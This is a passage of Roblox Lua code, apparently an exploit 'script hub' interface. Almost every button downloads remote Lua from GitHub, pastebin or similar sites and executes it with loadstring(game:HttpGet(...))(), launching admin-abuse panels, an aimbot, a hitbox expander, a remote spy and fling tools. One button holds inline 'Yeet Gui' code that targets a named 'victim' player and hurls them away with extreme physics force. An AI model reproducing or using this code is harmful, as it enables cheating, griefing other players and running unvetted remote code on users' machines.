sc4.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

local sc5 = Instance.new("TextButton")
sc5.Parent = sc
sc5.Name = "sc5"
sc5.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc5.Position = UDim2.new(0.69, 0, 0.150, 0)
sc5.BackgroundColor3 = Color3.new(0, 0, 0)
sc5.BorderColor3 = Color3.new(1, 0, 0)
sc5.BorderSizePixel = 3
sc5.TextColor3 = Color3.new(1, 1, 1)
sc5.TextScaled = true
sc5.Font = Enum.Font.Roboto
sc5.Text = "Keyboard"
sc5.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Delta-Scripts/refs/heads/main/MobileKeyboard.txt", true))()
end)

local sc6 = Instance.new("TextButton")
sc6.Parent = sc
sc6.Name = "sc6"
sc6.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
sc6.Position = UDim2.new(0.86, 0, 0.150, 0)
sc6.BackgroundColor3 = Color3.new(0, 0, 0)
sc6.BorderColor3 = Color3.new(1, 0, 0)
sc6.BorderSizePixel = 3
sc6.TextColor3 = Color3.new(1, 1, 1)
sc6.TextScaled = true
sc6.Font = Enum.Font.Roboto
sc6.Text = "Remote Spy"
sc6.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
end)

local sc7 = Instance.new("TextButton")
sc7.Parent = sc
sc7.Name = "sc7"
sc7.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc7.Position = UDim2.new(0.00996587239, 0, 0.350, 0)
sc7.BackgroundColor3 = Color3.new(0, 0, 0)
sc7.BorderColor3 = Color3.new(1, 0, 0)
sc7.BorderSizePixel = 3
sc7.TextColor3 = Color3.new(1, 1, 1)
sc7.TextScaled = true
sc7.Font = Enum.Font.Roboto
sc7.Text = "RoChips admin panel"
sc7.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/load/refs/heads/main/rcloader"))()
--rochips panel
end)

local sc8 = Instance.new("TextButton")
sc8.Parent = sc
sc8.Name = "sc8"
sc8.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc8.Position = UDim2.new(0.18, 0, 0.350, 0)
sc8.BackgroundColor3 = Color3.new(0, 0, 0)
sc8.BorderColor3 = Color3.new(1, 0, 0)
sc8.BorderSizePixel = 3
sc8.TextColor3 = Color3.new(1, 1, 1)
sc8.TextScaled = true
sc8.Font = Enum.Font.Roboto
sc8.Text = "Fe Npc Control Panel"
sc8.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty38.lua"))()
--made by Im_Patrick, subscribe on youtube now!
end)

local sc9 = Instance.new("TextButton")
sc9.Parent = sc
sc9.Name = "sc9"
sc9.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc9.Position = UDim2.new(0.35, 0, 0.350, 0)
sc9.BackgroundColor3 = Color3.new(0, 0, 0)
sc9.BorderColor3 = Color3.new(1, 0, 0)
sc9.BorderSizePixel = 3
sc9.TextColor3 = Color3.new(1, 1, 1)
sc9.TextScaled = true
sc9.Font = Enum.Font.Roboto
sc9.Text = "Dex Explorer"
sc9.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)

local sc10 = Instance.new("TextButton")
sc10.Parent = sc
sc10.Name = "sc10"
sc10.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc10.Position = UDim2.new(0.52, 0, 0.350, 0)
sc10.BackgroundColor3 = Color3.new(0, 0, 0)
sc10.BorderColor3 = Color3.new(1, 0, 0)
sc10.BorderSizePixel = 3
sc10.TextColor3 = Color3.new(1, 1, 1)
sc10.TextScaled = true
sc10.Font = Enum.Font.Roboto
sc10.Text = "LALOL Backdoor Scanner"
sc10.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LALOL-hub-without-hint-19587"))()
end)

local sc11 = Instance.new("TextButton")
sc11.Parent = sc
sc11.Name = "sc11"
sc11.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc11.Position = UDim2.new(0.69, 0, 0.350, 0)
sc11.BackgroundColor3 = Color3.new(0, 0, 0)
sc11.BorderColor3 = Color3.new(0, 1, 0)
sc11.BorderSizePixel = 3
sc11.TextColor3 = Color3.new(1, 1, 1)
sc11.TextScaled = true
sc11.Font = Enum.Font.Roboto
sc11.Text = "Sus Gui"
sc11.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://pastefy.app/BH625PSd/raw"))()
end)

local sc12 = Instance.new("TextButton")
sc12.Parent = sc
sc12.Name = "sc12"
sc12.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
sc12.Position = UDim2.new(0.86, 0, 0.350, 0)
sc12.BackgroundColor3 = Color3.new(0, 0, 0)
sc12.BorderColor3 = Color3.new(1, 0, 0)
sc12.BorderSizePixel = 3
sc12.TextColor3 = Color3.new(1, 1, 1)
sc12.TextScaled = true
sc12.Font = Enum.Font.Roboto
sc12.Text = "Aimbot"
sc12.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/smile3911/yooooothisloads/main/aimbot"))()
end)

local sc13 = Instance.new("TextButton")
sc13.Parent = sc
sc13.Name = "sc13"
sc13.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc13.Position = UDim2.new(0.00996587239, 0, 0.550, 0)
sc13.BackgroundColor3 = Color3.new(0, 0, 0)
sc13.BorderColor3 = Color3.new(1, 0, 0)
sc13.BorderSizePixel = 3
sc13.TextColor3 = Color3.new(1, 1, 1)
sc13.TextScaled = true
sc13.Font = Enum.Font.Roboto
sc13.Text = "Fates Admin"
sc13.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
end)

local sc14 = Instance.new("TextButton")
sc14.Parent = sc
sc14.Name = "sc14"
sc14.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc14.Position = UDim2.new(0.18, 0, 0.550, 0)
sc14.BackgroundColor3 = Color3.new(0, 0, 0)
sc14.BorderColor3 = Color3.new(1, 0, 0)
sc14.BorderSizePixel = 3
sc14.TextColor3 = Color3.new(1, 1, 1)
sc14.TextScaled = true
sc14.Font = Enum.Font.Roboto
sc14.Text = "Nameless Admin"
sc14.MouseButton1Click:Connect(function()
    -- Thanks to 0866 for making the whole ui work, this admin script was actually made in 2019 lol but was modified by qipu
-- For the commands thanks to IY, Fates Admin, HomeBrew, CMD-X for some of the code and command ideas!
-- For the people thanks to Digitality, i_db, rouxhaver, spec and the v3rmillion community, if you see your script in the source and want credits please dm qipu#9312
-- ! Make sure to have an executor that supports firetouchinterest for the tool commands !
loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
end)

local sc15 = Instance.new("TextButton")
sc15.Parent = sc
sc15.Name = "sc15"
sc15.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc15.Position = UDim2.new(0.35, 0, 0.550, 0)
sc15.BackgroundColor3 = Color3.new(0, 0, 0)
sc15.BorderColor3 = Color3.new(1, 0, 0)
sc15.BorderSizePixel = 3
sc15.TextColor3 = Color3.new(1, 1, 1)
sc15.TextScaled = true
sc15.Font = Enum.Font.Roboto
sc15.Text = "Nameless admin v2"
sc15.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/toyahfur/Nameless-Admin-2.0/main/unfinished-source-code'))()
end)

local sc16 = Instance.new("TextButton")
sc16.Parent = sc
sc16.Name = "sc16"
sc16.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc16.Position = UDim2.new(0.52, 0, 0.550, 0)
sc16.BackgroundColor3 = Color3.new(0, 0, 0)
sc16.BorderColor3 = Color3.new(1, 0, 0)
sc16.BorderSizePixel = 3
sc16.TextColor3 = Color3.new(1, 1, 1)
sc16.TextScaled = true
sc16.Font = Enum.Font.Roboto
sc16.Text = "Hitbox Expander"
sc16.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua"))()
end)

local sc17 = Instance.new("TextButton")
sc17.Parent = sc
sc17.Name = "sc17"
sc17.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc17.Position = UDim2.new(0.69, 0, 0.550, 0)
sc17.BackgroundColor3 = Color3.new(0, 0, 0)
sc17.BorderColor3 = Color3.new(1, 0, 0)
sc17.BorderSizePixel = 3
sc17.TextColor3 = Color3.new(1, 1, 1)
sc17.TextScaled = true
sc17.Font = Enum.Font.Roboto
sc17.Text = "Skibidi Hub"
sc17.MouseButton1Click:Connect(function()
--join for more scritps! https://discord.gg/dtneYN6NTY
loadstring(game:HttpGet("https://raw.githubusercontent.com/aemos2/Skibidihub/refs/heads/main/SkibidiHUB.txt"))()
end)

local sc18 = Instance.new("TextButton")
sc18.Parent = sc
sc18.Name = "sc18"
sc18.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
sc18.Position = UDim2.new(0.86, 0, 0.550, 0)
sc18.BackgroundColor3 = Color3.new(0, 0, 0)
sc18.BorderColor3 = Color3.new(1, 0, 0)
sc18.BorderSizePixel = 3
sc18.TextColor3 = Color3.new(1, 1, 1)
sc18.TextScaled = true
sc18.Font = Enum.Font.Roboto
sc18.Text = "Keyboard Key Generator"
sc18.MouseButton1Click:Connect(function()
    -- Keyboard script By Red_BloxZ
-- You screen will freeze for a few seconds when execute because it loading

loadstring(game:HttpGet("https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr"))()
end)

local sc19 = Instance.new("TextButton")
sc19.Parent = sc
sc19.Name = "sc19"
sc19.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc19.Position = UDim2.new(0.00996587239, 0, 0.750, 0)
sc19.BackgroundColor3 = Color3.new(0, 0, 0)
sc19.BorderColor3 = Color3.new(1, 0, 0)
sc19.BorderSizePixel = 3
sc19.TextColor3 = Color3.new(1, 1, 1)
sc19.TextScaled = true
sc19.Font = Enum.Font.Roboto
sc19.Text = "Ghost Hub"
sc19.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
end)

local sc20 = Instance.new("TextButton")
sc20.Parent = sc
sc20.Name = "sc20"
sc20.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc20.Position = UDim2.new(0.18, 0, 0.750, 0)
sc20.BackgroundColor3 = Color3.new(0, 0, 0)
sc20.BorderColor3 = Color3.new(1, 0, 0)
sc20.BorderSizePixel = 3
sc20.TextColor3 = Color3.new(1, 1, 1)
sc20.TextScaled = true
sc20.Font = Enum.Font.Roboto
sc20.Text = "Reach Gui v5"
sc20.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/etotspia5/Reach-v5.0/main/Reach%20V5.0"))()
end)

local sc21 = Instance.new("TextButton")
sc21.Parent = sc
sc21.Name = "sc21"
sc21.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc21.Position = UDim2.new(0.35, 0, 0.750, 0)
sc21.BackgroundColor3 = Color3.new(0, 0, 0)
sc21.BorderColor3 = Color3.new(1, 0, 0)
sc21.BorderSizePixel = 3
sc21.TextColor3 = Color3.new(1, 1, 1)
sc21.TextScaled = true
sc21.Font = Enum.Font.Roboto
sc21.Text = "Shiftlock"
sc21.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://github.com/ltseverydayyou/uuuuuuu/blob/main/shiftlock?raw=true"))()
end)

local sc22 = Instance.new("TextButton")
sc22.Parent = sc
sc22.Name = "sc22"
sc22.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc22.Position = UDim2.new(0.52, 0, 0.750, 0)
sc22.BackgroundColor3 = Color3.new(0, 0, 0)
sc22.BorderColor3 = Color3.new(1, 0, 0)
sc22.BorderSizePixel = 3
sc22.TextColor3 = Color3.new(1, 1, 1)
sc22.TextScaled = true
sc22.Font = Enum.Font.Roboto
sc22.Text = "Eazvy Hub"
sc22.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Eazvy/public-scripts/main/Universal_Animations_Emotes.lua"))() 
end)

local sc23 = Instance.new("TextButton")
sc23.Parent = sc
sc23.Name = "sc23"
sc23.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc23.Position = UDim2.new(0.69, 0, 0.750, 0)
sc23.BackgroundColor3 = Color3.new(0, 0, 0)
sc23.BorderColor3 = Color3.new(1, 0, 0)
sc23.BorderSizePixel = 3
sc23.TextColor3 = Color3.new(1, 1, 1)
sc23.TextScaled = true
sc23.Font = Enum.Font.Roboto
sc23.Text = "Orca hub"
sc23.MouseButton1Click:Connect(function()
    loadstring(
  game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua")
)()
end)

local sc24 = Instance.new("TextButton")
sc24.Parent = sc
sc24.Name = "sc24"
sc24.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
sc24.Position = UDim2.new(0.86, 0, 0.750, 0)
sc24.BackgroundColor3 = Color3.new(0, 0, 0)
sc24.BorderColor3 = Color3.new(1, 0, 0)
sc24.BorderSizePixel = 3
sc24.TextColor3 = Color3.new(1, 1, 1)
sc24.TextScaled = true
sc24.Font = Enum.Font.Roboto
sc24.Text = "Sirius Pro"
sc24.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Sirius-Pro-9527", true))()
end)


local scn25 = Instance.new("TextButton")
scn25.Parent = sc
scn25.Name = "scn25"
scn25.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn25.Position = UDim2.new(0.00996587239, 0, 0.03, 0)
scn25.BackgroundColor3 = Color3.new(0, 0, 0)
scn25.BorderColor3 = Color3.new(1, 0, 0)
scn25.BorderSizePixel = 3
scn25.TextColor3 = Color3.new(1, 1, 1)
scn25.TextScaled = true
scn25.Font = Enum.Font.Roboto
scn25.Text = "Krunox"
scn25.Visible = false
scn25.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Krunox-13336"))()
end)

local scn26 = Instance.new("TextButton")
scn26.Parent = sc
scn26.Name = "scn26"
scn26.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn26.Position = UDim2.new(0.18, 0, 0.03, 0)
scn26.BackgroundColor3 = Color3.new(0, 0, 0)
scn26.BorderColor3 = Color3.new(1, 0, 0)
scn26.BorderSizePixel = 3
scn26.TextColor3 = Color3.new(1, 1, 1)
scn26.TextScaled = true
scn26.Font = Enum.Font.Roboto
scn26.Text = "Hydroxide"
scn26.Visible = false
scn26.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/init.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/Scripts/main/init.lua"))()
-- HYDROXIDE IS NOT MADE BY ME! I JUST MODIFIED IT SO IT WORKS WITH WAVE!
end)

local scn27 = Instance.new("TextButton")
scn27.Parent = sc
scn27.Name = "scn27"
scn27.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn27.Position = UDim2.new(0.35, 0, 0.03, 0)
scn27.BackgroundColor3 = Color3.new(0, 0, 0)
scn27.BorderColor3 = Color3.new(0, 1, 0)
scn27.BorderSizePixel = 3
scn27.TextColor3 = Color3.new(1, 1, 1)
scn27.TextScaled = true
scn27.Font = Enum.Font.Roboto
scn27.Text = "Replication UI"
scn27.Visible = false
scn27.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/tMYrf22E"))()
end)

local scn28 = Instance.new("TextButton")
scn28.Parent = sc
scn28.Name = "scn28"
scn28.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn28.Position = UDim2.new(0.52, 0, 0.03, 0)
scn28.BackgroundColor3 = Color3.new(0, 0, 0)
scn28.BorderColor3 = Color3.new(0, 0, 1)
scn28.BorderSizePixel = 3
scn28.TextColor3 = Color3.new(1, 1, 1)
scn28.TextScaled = true
scn28.Font = Enum.Font.Roboto
scn28.Text = "F3X"
scn28.Visible = false
scn28.MouseButton1Click:Connect(function()
    loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end)

local scn29 = Instance.new("TextButton")
scn29.Parent = sc
scn29.Name = "scn29"
scn29.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn29.Position = UDim2.new(0.69, 0, 0.03, 0)
scn29.BackgroundColor3 = Color3.new(0, 0, 0)
scn29.BorderColor3 = Color3.new(1, 0, 0)
scn29.BorderSizePixel = 3
scn29.TextColor3 = Color3.new(1, 1, 1)
scn29.TextScaled = true
scn29.Font = Enum.Font.Roboto
scn29.Text = "F3X Panel"
scn29.Visible = false
scn29.MouseButton1Click:Connect(function()
    -- join https://discord.gg/bESPJj7h7U
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
end)

local scn30 = Instance.new("TextButton")
scn30.Parent = sc
scn30.Name = "scn30"
scn30.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scn30.Position = UDim2.new(0.86, 0, 0.03, 0)
scn30.BackgroundColor3 = Color3.new(0, 0, 0)
scn30.BorderColor3 = Color3.new(1, 1, 0)
scn30.BorderSizePixel = 3
scn30.TextColor3 = Color3.new(1, 1, 1)
scn30.TextScaled = true
scn30.Font = Enum.Font.Roboto
scn30.Text = "Solara Hub"
scn30.Visible = false
scn30.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/DMHQYUOf/raw"))()
end)

local scn31 = Instance.new("TextButton")
scn31.Parent = sc
scn31.Name = "scn31"
scn31.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn31.Position = UDim2.new(0.00996587239, 0, 0.229999959, 0)
scn31.BackgroundColor3 = Color3.new(0, 0, 0)
scn31.BorderColor3 = Color3.new(1, 0, 0)
scn31.BorderSizePixel = 3
scn31.TextColor3 = Color3.new(1, 1, 1)
scn31.TextScaled = true
scn31.Font = Enum.Font.SourceSans
scn31.Text = "Free Boombox Visualizer"
scn31.Visible = false
scn31.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/vyks/vyks/refs/heads/main/FreeBoomBoxHub.lua'))()
end)

local scn32 = Instance.new("TextButton")
scn32.Parent = sc
scn32.Name = "scn32"
scn32.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn32.Position = UDim2.new(0.18, 0, 0.229999959, 0)
scn32.BackgroundColor3 = Color3.new(0, 0, 0)
scn32.BorderColor3 = Color3.new(1, 0, 0)
scn32.BorderSizePixel = 3
scn32.TextColor3 = Color3.new(1, 1, 1)
scn32.TextScaled = true
scn32.Font = Enum.Font.SourceSans
scn32.Text = "EternalWare Hub v1"
scn32.Visible = false
scn32.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/cGh1HHUv'))()
end)

local scn33 = Instance.new("TextButton")
scn33.Parent = sc
scn33.Name = "scn33"
scn33.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn33.Position = UDim2.new(0.35, 0, 0.229999959, 0)
scn33.BackgroundColor3 = Color3.new(0, 0, 0)
scn33.BorderColor3 = Color3.new(1, 0, 0)
scn33.BorderSizePixel = 3
scn33.TextColor3 = Color3.new(1, 1, 1)
scn33.TextScaled = true
scn33.Font = Enum.Font.Roboto
scn33.Text = "Audio Logger"
scn33.Visible = false
scn33.MouseButton1Click:Connect(function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'),true))()
end)

local scn34 = Instance.new("TextButton")
scn34.Parent = sc
scn34.Name = "scn34"
scn34.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn34.Position = UDim2.new(0.52, 0, 0.229999959, 0)
scn34.BackgroundColor3 = Color3.new(0, 0, 0)
scn34.BorderColor3 = Color3.new(1, 0, 0)
scn34.BorderSizePixel = 3
scn34.TextColor3 = Color3.new(1, 1, 1)
scn34.TextScaled = true
scn34.Font = Enum.Font.Roboto
scn34.Text = "Walkfling Gui"
scn34.Visible = false
scn34.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
end)

local scn35 = Instance.new("TextButton")
scn35.Parent = sc
scn35.Name = "scn35"
scn35.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn35.Position = UDim2.new(0.69, 0, 0.229999959, 0)
scn35.BackgroundColor3 = Color3.new(0, 0, 0)
scn35.BorderColor3 = Color3.new(0, 1, 0)
scn35.BorderSizePixel = 3
scn35.TextColor3 = Color3.new(1, 1, 1)
scn35.TextScaled = true
scn35.Font = Enum.Font.Roboto
scn35.Text = "Yeet Gui"
scn35.Visible = false
scn35.MouseButton1Click:Connect(function()
local lp = game:FindService("Players").LocalPlayer

local function gplr(String)
	local Found = {}
	local strl = String:lower()
	if strl == "all" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			table.insert(Found,v)
		end
	elseif strl == "others" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name ~= lp.Name then
				table.insert(Found,v)
			end
		end 
	elseif strl == "me" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name == lp.Name then
				table.insert(Found,v)
			end
		end 
	else
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name:lower():sub(1, #String) == String:lower() then
				table.insert(Found,v)
			end
		end 
	end
	return Found 
end

local function notif(str,dur)
	game:FindService("StarterGui"):SetCore("SendNotification", {
		Title = "yeet gui",
		Text = str,
		Icon = "rbxassetid://2005276185",
		Duration = dur or 3
	})
end

--// sds

local h = Instance.new("ScreenGui")
local Main = Instance.new("ImageLabel")
local Top = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")

h.Name = "h"
h.Parent = game:GetService("CoreGui")
h.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = h
Main.Active = true
Main.Draggable = true
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
Main.Size = UDim2.new(0, 454, 0, 218)
Main.Draggable = true 

Top.Name = "Top"
Top.Parent = Main
Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
Top.BorderSizePixel = 0
Top.Size = UDim2.new(0, 454, 0, 44)

Title.Name = "Title"
Title.Parent = Top
Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0, 0, 0.295454562, 0)
Title.Size = UDim2.new(0, 454, 0, 30)
Title.Font = Enum.Font.SourceSans
Title.Text = "Yeet Gui(Priv Edition)"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
TextBox.Size = UDim2.new(0, 388, 0, 62)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = "(Enter the name of the victim.)"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
TextButton.Size = UDim2.new(0, 359, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "[[Yeet Player]]"
TextButton.TextColor3 = Color3.fromRGB(1, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextButton.MouseButton1Click:Connect(function()
	local Target = gplr(TextBox.Text)
	if Target[1] then
		Target = Target[1]
		
		local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
		Thrust.Force = Vector3.new(9999999999999999,9999999999999,999999999999)
		Thrust.Name = "YeetForce"
		repeat
			lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
			Thrust.Location = Target.Character.HumanoidRootPart.Position
			game:FindService("RunService").Heartbeat:wait()
		until not Target.Character:FindFirstChild("Head")
	else
		notif("Invalid player")
	end
end)

--//fsddfsdf
notif("Loaded successfully! Created by 09baRavenaaAlt", 5)
end)

local scn36 = Instance.new("TextButton")
scn36.Parent = sc
scn36.Name = "scn36"
scn36.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scn36.Position = UDim2.new(0.86, 0, 0.229999959, 0)
scn36.BackgroundColor3 = Color3.new(0, 0, 0)
scn36.BorderColor3 = Color3.new(0, 1, 0)
scn36.BorderSizePixel = 3
scn36.TextColor3 = Color3.new(1, 1, 1)
scn36.TextScaled = true
scn36.Font = Enum.Font.Roboto
scn36.Text = "Kawaii Uanchored Gui"
scn36.Visible = false
scn36.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-AURA/main/kawaii_aura.lua", true))()
end)

local scn37 = Instance.new("TextButton")
scn37.Parent = sc
scn37.Name = "scn37"
scn37.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn37.Position = UDim2.new(0.00996587239, 0, 0.43, 0)
scn37.BackgroundColor3 = Color3.new(0, 0, 0)
scn37.BorderColor3 = Color3.new(1, 0, 0)
scn37.BorderSizePixel = 3
scn37.TextColor3 = Color3.new(1, 1, 1)
scn37.TextScaled = true
scn37.Font = Enum.Font.Roboto
scn37.Text = "Debuggers hub"
scn37.Visible = false
scn37.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Emircxy/Lear/refs/heads/main/Debuggers"))()
end)

local scn38 = Instance.new("TextButton")
scn38.Parent = sc
scn38.Name = "scn38"
scn38.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn38.Position = UDim2.new(0.18, 0, 0.43, 0)
scn38.BackgroundColor3 = Color3.new(0, 0, 0)
scn38.BorderColor3 = Color3.new(0, 1, 0)
scn38.BorderSizePixel = 3
scn38.TextColor3 = Color3.new(1, 1, 1)
scn38.TextScaled = true
scn38.Font = Enum.Font.Roboto
scn38.Text = "Super Ring"
scn38.Visible = false
scn38.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/kyuu-is-fire/refs/heads/main/and%20projeto%20lkb%20Super%20Ring"))()
end)

local scn39 = Instance.new("TextButton")
scn39.Parent = sc
scn39.Name = "scn39"
scn39.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn39.Position = UDim2.new(0.35, 0, 0.43, 0)
scn39.BackgroundColor3 = Color3.new(0, 0, 0)
scn39.BorderColor3 = Color3.new(1, 0, 0)
scn39.BorderSizePixel = 3
scn39.TextColor3 = Color3.new(1, 1, 1)
scn39.TextScaled = true
scn39.Font = Enum.Font.Roboto
scn39.Text = "Vehicle Fly"
scn39.Visible = false
scn39.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/hX2s2DVY"))()
end)

local scn40 = Instance.new("TextButton")
scn40.Parent = sc
scn40.Name = "scn40"
scn40.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn40.Position = UDim2.new(0.52, 0, 0.43, 0)
scn40.BackgroundColor3 = Color3.new(0, 0, 0)
scn40.BorderColor3 = Color3.new(1, 0, 0)
scn40.BorderSizePixel = 3
scn40.TextColor3 = Color3.new(1, 1, 1)
scn40.TextScaled = true
scn40.Font = Enum.Font.Roboto
scn40.Text = "Fedoratum Admin Abuse"
scn40.Visible = false
scn40.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/showcases/main/fedoratumadmin"))()
end)

local scn41 = Instance.new("TextButton")
scn41.Parent = sc
scn41.Name = "scn41"
scn41.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn41.Position = UDim2.new(0.69, 0, 0.43, 0)
scn41.BackgroundColor3 = Color3.new(0, 0, 0)
scn41.BorderColor3 = Color3.new(1, 1, 0)
scn41.BorderSizePixel = 3
scn41.TextColor3 = Color3.new(1, 1, 1)
scn41.TextScaled = true
scn41.Font = Enum.Font.Roboto
scn41.Text = "Smorg's hub Remote Gui v1"
scn41.Visible = false
scn41.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MIKEDRIPZOWSKU/test/refs/heads/main/SmorgsHubRemoteGui.lua", true))()
end)

local scn42 = Instance.new("TextButton")
scn42.Parent = sc
scn42.Name = "scn42"
scn42.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scn42.Position = UDim2.new(0.86, 0, 0.43, 0)
scn42.BackgroundColor3 = Color3.new(0, 0, 0)
scn42.BorderColor3 = Color3.new(0, 1, 0)
scn42.BorderSizePixel = 3
scn42.TextColor3 = Color3.new(1, 1, 1)
scn42.TextScaled = true
scn42.Font = Enum.Font.Roboto
scn42.Text = "Click Fling"
scn42.Visible = false
